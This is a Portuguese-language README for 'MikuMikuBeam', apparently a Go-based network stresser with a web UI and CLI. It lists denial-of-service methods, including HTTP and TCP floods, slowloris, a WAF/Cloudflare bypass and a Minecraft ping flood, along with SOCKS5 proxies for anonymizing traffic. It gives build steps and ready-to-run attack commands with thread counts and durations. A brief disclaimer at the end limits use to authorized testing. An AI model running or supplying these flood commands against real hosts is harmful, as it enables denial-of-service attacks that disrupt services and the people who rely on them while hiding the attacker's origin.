# MikuMikuBeam — Network Stresser (Go)

## Como funciona

MikuMikuBeam é um stress tester escrito em **Go** com servidor web embutido e interface visual no browser (tema Hatsune Miku). Funciona no modelo cliente/servidor:

- `mmb-server` — servidor HTTP que recebe comandos e executa os ataques
- `mmb-cli` — cliente de linha de comando para enviar comandos ao servidor

**Métodos de ataque suportados:**

| Método | Camada | Descrição |
|--------|--------|-----------|
| `http-flood` | L7 | HTTP GET flood |
| `http-bypass` | L7 | Bypass de proteções WAF/Cloudflare |
| `http-burst` | L7 | Burst de requisições HTTP |
| `http-slowloris` | L7 | Slowloris HTTP |
| `tcp-flood` | L4 | TCP flood |
| `tcp-burst` | L4 | TCP burst |
| `tcp-slowloris` | L4 | Slowloris TCP |
| `minecraft-ping` | Game | Flood de ping para servidores Minecraft |

Suporta proxies SOCKS5 para anonimizar o tráfego.

## Dependências

Precisa de **Go 1.24+** instalado:

```bash
# Verificar versão
go version

# Instalar Go (se não tiver)
sudo apt install golang-go
# ou baixar de https://go.dev/dl/
```

## Como compilar

```bash
cd mikumikubeam/

# Compilar servidor e cliente
make build
# Gera: ./mmb-server e ./mmb-cli

# Ou compilar manualmente
go build -o mmb-server ./cmd/mmb-server/
go build -o mmb-cli ./cmd/mmb-cli/
```

## Como usar

### 1. Iniciar o servidor

```bash
./mmb-server
# Servidor sobe em http://127.0.0.1:8080
# Acesse no browser para ver a interface visual
```

### 2. Usar via CLI

```bash
# HTTP flood — 100 threads, 60 segundos
./mmb-cli attack --method http-flood --target http://192.168.1.100 --threads 100 --duration 60

# TCP flood
./mmb-cli attack --method tcp-flood --target 192.168.1.100:80 --threads 50 --duration 30

# HTTP Slowloris
./mmb-cli attack --method http-slowloris --target http://192.168.1.100 --threads 200 --duration 120

# Com proxies SOCKS5
./mmb-cli attack --method http-flood --target http://192.168.1.100 --threads 100 --duration 60 --proxies proxies.txt
```

### 3. Usar via interface web

```bash
./mmb-server
# Abra http://127.0.0.1:8080 no browser
# Configure método, alvo, threads e duração pela UI
```

## Rodar com Docker

```bash
# Build
docker build -t mmb .

# Rodar servidor
docker run -p 8080:8080 mmb
```

## Estrutura do projeto

```
mikumikubeam/
├── cmd/
│   ├── mmb-server/main.go   # Servidor HTTP + UI
│   └── mmb-cli/main.go      # Cliente CLI
├── internal/attacks/
│   ├── http/                # Métodos HTTP (flood, bypass, burst, slowloris)
│   └── tcp/                 # Métodos TCP (flood, burst, slowloris)
├── go.mod
├── go.sum
└── Makefile
```

## ⚠️ Aviso Legal

Use **somente em ambientes que você tem autorização**. Projeto criado para fins educacionais e testes de stress autorizados.
